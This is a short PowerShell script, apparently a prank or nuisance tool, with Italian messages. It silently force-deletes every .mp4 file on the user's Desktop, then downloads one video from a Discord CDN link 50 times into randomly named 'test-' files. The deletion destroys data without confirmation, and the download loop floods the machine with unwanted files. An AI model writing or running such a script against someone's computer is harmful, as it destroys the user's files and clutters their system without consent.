$desktopPath = [System.Environment]::GetFolderPath('Desktop')
$mp4Files = Get-ChildItem -Path $desktopPath -Filter *.mp4
if ($mp4Files.Count -eq 0) {
    Write-Host "Nessun file .mp4 trovato sul desktop."
} else {
    foreach ($file in $mp4Files) {
        try {
            Remove-Item -Path $file.FullName -Force
            Write-Host "Eliminato: $($file.Name)"
        } catch {
            Write-Host "Errore nell'eliminazione di $($file.Name): $_"
        }
    }
}

Start-Sleep -Seconds 2

$url = 'https://cdn.discordapp.com/attachments/1149399740652466267/1167554693820600400/VID-20231004-WA0002.mp4?ex=665cd08b&is=665b7f0b&hm=a89cced083bb2c0dc3dfd5f5846e94bf144acc21eec47d8b178ae106b2d43a4f&'  
$numFiles = 50  
function Generate-RandomString($length) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    $randomString = -join ((Get-Random -InputObject $chars -Count $length) | ForEach-Object { $_ })
    return $randomString
}
for ($i = 1; $i -le $numFiles; $i++) {
    $randomSuffix = Generate-RandomString -length 10
    $output = "test-$randomSuffix-$i.mp4"
    Invoke-WebRequest -Uri $url -OutFile $output
}
